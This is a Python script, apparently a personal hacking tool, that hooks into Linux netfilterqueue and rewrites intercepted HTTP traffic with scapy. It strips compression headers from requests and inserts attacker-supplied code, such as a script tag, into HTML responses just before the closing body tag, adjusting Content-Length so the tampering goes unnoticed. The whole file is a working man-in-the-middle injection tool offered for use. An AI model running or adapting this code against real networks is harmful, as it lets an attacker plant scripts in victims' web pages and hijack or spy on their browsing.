#!/usr/bin/env python

import argparse
import re
import netfilterqueue
import scapy.all as scapy

"""
    To run the script follow the example below:
    
    Usage:
      ./python script_name.py --code '<script>alert("test");</script>' 
    
    License:
        MIT License

        Copyright (c) 2023 Marco A. Villarruel

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
"""

__author__      = "Marco A. Villarruel"
__authors__     = ["Marco A. Villarruel"]
__contact__     = "marco.urquieta@proton.me"
__copyright__   = "Copyright 2013, WildBerry"
__credits__     = ["Marco A. Villarruel"]
__date__        = "2023/06/15"
__deprecated__  = False
__email__       =  "marco.urquieta@proton.me"
__license__     = "GPLv3"
__maintainer__  = "developer"
__status__      = "Production"
__version__     = "1.0.0"


def logo():
    print("""
        ___    __    __   __  ____  ____  ___   __   _
       / __)  /__\  (  \_/  )(  _ \( ___)/ _ \ (  \_( )
      ( (__  /(__)\ )  ___  ( )___/ )__)( (_) )) (\ ) (
       \___)(__)(__)(__) (__)(__)  (____)\___/ (_) \__)
 _    _  _____  _     ____   _____  ____  _____  _____  _   _
( )  ( )(__ __)( )   (  _ \ ( (_) \( ___)( (_) )( (_) )( )_( )  
) (/\) ( _( )_ ) (__ ) (_) ))  _  ( )__) ) (\ ( ) (\ (  \   /
(_/  \_)(_____)(____)(____/ (_(_)_/(____)(_) \_)(_) \_)  (_)
        """)

def get_args():
    """
    Parse and return command line arguments.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--code", dest="injection_code",
                        help="Injection code", required=True)
    args = parser.parse_args()
    return args


def set_load(packet, load):
    """
    Set payload and recalculate the necessary fields.
    """
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet, injection_code):
    """
    Analyze and manipulate packets.
    """
    scapy_packet = scapy.IP(packet.get_payload())
    select_port = 8080

    if scapy_packet.haslayer(scapy.Raw):
        load = str(scapy_packet[scapy.Raw].load)

        if scapy_packet[scapy.TCP].dport == select_port:
            load = re.sub('Accept-Encoding:.*?\\\\r\\\\n', '', load)
            load = load.replace('HTTP/1.1', 'HTTP/1.0')

        elif scapy_packet[scapy.TCP].sport == select_port:
            if '</body>' in load:
                load = load.replace('</body>', injection_code + '</body>')
                content_length_search = re.search(
                    '(?:Content-Length:\\s)(\\d*)', load)

                if content_length_search and 'text/html' in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(
                        content_length) + len(injection_code)
                    load = load.replace(
                        content_length, str(new_content_length))

        if load != str(scapy_packet[scapy.Raw].load):
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()


def main():
    logo()
    """
    Main function to run the script logic.
    """
    options = get_args()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, lambda packet: process_packet(
        packet, options.injection_code))
    queue.run()


if __name__ == "__main__":
    main()
